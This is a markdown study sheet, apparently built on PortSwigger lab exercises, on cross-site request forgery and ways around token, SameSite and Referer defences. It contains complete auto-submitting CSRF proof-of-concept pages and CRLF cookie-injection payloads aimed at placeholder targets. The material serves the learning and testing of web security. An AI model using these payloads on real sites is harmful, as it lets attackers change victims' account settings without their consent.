# CSRF(Cross-Site-Request-Forgery)
## [REFERENCNE](https://portswigger.net/web-security/csrf)
---

### 1) CSRF vulnerability with no defenses -
   1) Check for the sensitive functionalities(relevant actions) like change-email,delete account etc.
   2) Intercept the request, generate CSRF poc and test in browser. If the action done successfully then it's vulnerable to CSRF.
---
### 2) CSRF where token validation depends on request method -  

   1) Go the functionality(any relevant action), intercept the request
   2) Change the request method to `POST,GET,PUT etc`, and do the same i..e modify the csrf token value, if accepted, generate a csrf POC with auto-submit script.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 3) CSRF where token validation depends on token being present  

   1) Go the functionality, intercept the request
   2) Change the request `method to POST,GET,PUT etc`, if still getting error, `remove the csrf parameter entirely`.
---
### 4) CSRF where token is not tied to user session 

   1) Go to the functionality, intercept the request
   2) Now sometimes application does `not tied the csrf token with users session`, in this case all we need is a fresh/unique csrf token in every new request.
   3) For that, we can use another account for the fresh unique csrf token. attack scenario be like....
         - Create 2 accounts, Account-A & Account-B
         - Intercept the request from Account-A 
         - Login to Account-B, copy the csrf token 
         - Put the csrf token in the Account-A request and generate/test a csrf POC.
---
### 5) CSRF where token is tied to non-session cookie -      

   1) Go the functionality, intercept the request
   2) Sometimes application `tied the csrf token` with `non-user sessions`, like (`csrf-key,X-csrf-value: etc`.), in this case we need to somehow inject our cookie into the victim's browser this can be done by CRLF, where the url term is reflected in the form of response header.
   3) Suppose we had CRLF in the `search` functionality. 
   4) In this case, attack scenario be like....
         - Create an account, Account-A , navigate to functionality
         - Intercept the request from Account-A, since csrf token is tied to some kind of other csrf-key/value. 
         - We can take the advantage of CRLF in the `search` term functionality, we can inject our payload by turning case into `XSS to CSRF`, by using the below payload in the place of `auto-submit script` i..e `<script>document.forms[0].submit()</script>`

         `<img src="https://abc.target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
         
         - The whole csrf POC , be like..

          `<html>
		  <!-- CSRF PoC - generated by Burp Suite Professional -->
		  <body>
		  <script>history.pushState('', '', '/')</script>
		    <form action="https://abc.target.com/my-account/change-email" method="POST">
		      <input type="hidden" name="email" value="changed&#64;email12&#46;com" />
		      <input type="hidden" name="csrf" value="W8E0YwG5n23SdN6xJQXG6kvMwHeKY9Pk" />
		      <input type="submit" value="Submit request" />
		    </form>
		    <img src="https://abc.target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=GBKiGXx7q5pFWopFJqfMCkKqyYMColhn%3b%20SameSite=None" onerror="document.forms[0].submit()">
		  </body>
		</html>` 
---
### 7) CSRF where token is duplicated in cookie -  

   1) Go the functionality, intercept the request
   2) Sometimes application tied the csrf token with `non-user sessions` with `same value in both`, like (`csrf-key,X-csrf-value: etc`.), in this case we need to somehow inject our cookie into the victim's browser this can be done by CRLF, where the url term is reflected in the form of response header.
   3) Suppose we had CRLF in the `search` functionality. 
   4) In this case, attack scenario be like....
         - Create an account, Account-A , navigate to functionality
         - Intercept the request from Account-A, since csrf token is tied to some kind of other csrf-key/value. 
         - We can take the advantage of CRLF in the `search` term functionality, we can inject our payload by turning case into `XSS to CSRF`, by using the below payload in the place of `auto-submit script` i..e `<script>document.forms[0].submit()</script>`

         `<img src="https://abc.target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
         
         - Since there is no need of any specific value for csrf token and key, we can put `literally-anything as a value`, The application only verify the value is being same or not??, The whole csrf POC , be like..

           <html>
		  <!-- CSRF PoC - generated by Burp Suite Professional -->
		  <body>
		  <script>history.pushState('', '', '/')</script>
		    <form action="https://abc.target.com/my-account/change-email" method="POST">
		      <input type="hidden" name="email" value="changed&#64;email12&#46;com" />
		      <input type="hidden" name="csrf" value="literally-anything" />
		      <input type="submit" value="Submit request" />
		    </form>
		    <img src="https://abc.target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=literally-anything%3b%20SameSite=None" onerror="document.forms[0].submit()">
		  </body>
		</html>      		
---
### Bypassing SAME-SITE cookie Restrictions

   1) SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.

   2) Chrome applies `Lax SameSite` restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. 

   3) In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or 
      `.net`, plus one additional level of the `domain name`. This is often referred to as the TLD+1.

      eg. `https://app.example.com` & `https://intranet.example.com/` are considered as same site, coz both have same scheme(`https://`),TLD(`.com`) and domain(`example`)
---
### Difference b/w same-site and same-origin

   1) The difference between a site and an origin is their scope; a `site encompasses multiple domain names`, whereas an `origin only includes one`. 

   2) Two URLs are considered to have the `same origin if they share the exact same scheme, domain name, and port`. Although note that the port is often inferred from the scheme.

            Request from            Request to                   Same-site?             Same-origin?
            https://example.com     https://example.com           Yes                     Yes
            https://app.example.com https://intranet.example.com  Yes                     No: mismatched domain name
            https://example.com     https://example.com:8080      Yes                     No: mismatched port
            https://example.com     https://example.co.uk         No: mismatched eTLD     No: mismatched domain name
            https://example.com     http://example.com            No: mismatched scheme   No: mismatched scheme


### 8) SameSite Lax bypass via method override 
   1) Sometime application doesn't explicitly specify any `SameSite` restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.
   2) In this case we can change the request method.
   3) If still not accepted by application server, we can use `&_method=POST` in the url parameter by changing the request into `GET`

      - `GET /my-account/change-email?email=pwned@target.com&_method=POST HTTP/1.1`

   4) We can host the below script in our(attacker) server.
      
      - `<script>document.location = "https://abc.target.com/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";</script>`
---
### 9) Bypassing Referer-based CSRF defenses - ###

   1) Some applications make use of the HTTP `Referer` header to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.

   2) Some applications validate the `Referer` header when it is present in requests `BUT skip the validation if the header is omitted`.

   3) An attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request.

         by using ~ `<meta name="referrer" content="never">`

   4) The whole CSRF poc will ...
   
           <html>
           <!-- CSRF PoC - generated by Burp Suite Professional -->
           <meta name="referrer" content="never">
           <body>
           <script>history.pushState('', '', '/')</script>
             <form action="https://abc.target.com/my-account/change-email" method="POST">
               <input type="hidden" name="email" value="email&#64;email&#46;com" />
               <input type="submit" value="Submit request" />
             </form>
             <script>
               document.forms[0].submit();
             </script>
           </body>
         </html>   
---
### 10) CSRF with broken Referer validation - ###

   1) Sometime applications only verify specific part of the domain in the `Referer` header.
   2) The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string., So in this case we can inject our arbitrary `Referer` header like : 

         - `Referer: https://arbitrary-incorrect-domain.net?abc.example.com`

         In the above case `abc.example.com` is our testing domain.

   3) Many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request we should includ `Referrer-Policy: unsafe-url` HTTP header in our malicious script.

   4) CSRF poc will ..

              <html>
              <!-- CSRF PoC - generated by Burp Suite Professional -->
              <body>
              <script>history.pushState('', '', '/?abc.example.com/')</script>
                <form action="https://abc.example.com/my-account/change-email" method="POST">
                  <input type="hidden" name="email" value="pwned&#64;email&#46;com" />
                  <input type="submit" value="Submit request" />
                </form>
                <script>
                  document.forms[0].submit();
                </script>
              </body>
            </html>  
---
---
